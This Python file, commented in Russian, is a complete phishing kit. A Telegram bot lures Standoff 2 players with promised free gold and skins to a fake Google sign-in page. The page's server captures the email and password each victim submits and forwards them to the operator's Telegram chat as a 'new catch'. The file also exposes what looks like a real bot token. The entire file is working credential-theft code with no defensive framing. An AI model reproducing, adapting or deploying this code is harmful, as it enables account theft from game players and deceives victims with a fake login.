import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiohttp import web
import urllib.parse

BOT_TOKEN = "8729915071:AAGn3w7rBkdeaVELxEQea8kgBY0jfljltKk"
ADMIN_CHAT_ID = "6739523131"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ----- Фейковая страница входа Google -----
FAKE_PAGE = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Вход в Standoff 2</title>
<style>
body{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{background:#16213e;padding:30px;border-radius:15px;color:white;width:350px;}
.input{width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;}
.btn{background:#4285f4;color:white;padding:12px;border:none;border-radius:5px;width:100%;}
</style>
</head>
<body>
<div class="card">
<h3>🔫 Вход в Standoff 2</h3>
<p>Для получения бонусов войдите в Google</p>
<form action="/login" method="POST">
<input type="email" name="email" class="input" placeholder="Электронная почта" required>
<input type="password" name="password" class="input" placeholder="Пароль" required>
<button type="submit" class="btn">✅ Войти</button>
</form>
</div>
</body>
</html>"""

# ----- Обработка веб-запросов -----
async def handle_index(request):
    return web.Response(text=FAKE_PAGE, content_type='text/html')

async def handle_login(request):
    data = await request.post()
    email = data.get('email', '')
    password = data.get('password', '')
    
    msg = f"🔓 НОВЫЙ УЛОВ!\n📧 Email: {email}\n🔑 Пароль: {password}"
    await bot.send_message(ADMIN_CHAT_ID, msg)
    
    return web.Response(text="<html><body><h3>✅ Бонусы начислены! Вернитесь в игру.</h3></body></html>",
                        content_type='text/html')

# ----- Telegram бот -----
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 ПОЛУЧИТЬ БОНУСЫ", url="https://standoff-bot-i57l.onrender.com/")]
    ])
    await message.answer(
        "🔫 STANDOFF 2 — АКЦИЯ!\n\n🔥 5000 золота + легендарный скин\n✅ Нажми на кнопку и войди через Google",
        reply_markup=keyboard
    )

# ----- Запуск веб-сервера и бота вместе -----
async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_index)
    app.router.add_post('/login', handle_login)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()
    print("Веб-сервер запущен на порту 8080")

async def main():
    asyncio.create_task(start_web_server())
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())